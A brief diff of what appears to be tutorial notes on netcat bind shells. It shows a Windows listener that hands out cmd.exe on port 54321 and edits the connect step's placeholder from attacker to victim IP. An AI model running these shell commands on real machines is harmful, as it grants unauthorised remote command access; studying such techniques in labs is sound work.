@@ -13,4 +13,4 @@ nc -n -v -l - p 54321 -e c:\Windows\System32\cmd.exe
 
 5. Run ncat on the windows machine to start a connection to the victim
 
-c:\> nc <attacker_ip> <listening_port> 
+c:\> nc <victim_ip> <listening_port> 
